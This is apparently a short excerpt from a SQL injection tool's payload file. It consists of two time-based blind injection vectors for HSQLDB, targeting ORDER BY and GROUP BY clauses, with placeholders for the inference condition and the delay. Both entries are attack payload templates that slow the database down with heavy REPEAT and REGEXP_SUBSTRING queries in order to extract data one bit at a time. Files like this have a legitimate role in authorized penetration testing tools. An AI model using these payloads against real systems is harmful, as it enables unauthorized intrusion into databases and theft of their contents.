test.title: HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)
test.vector: ,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)

test.title: HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)
test.vector: ,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
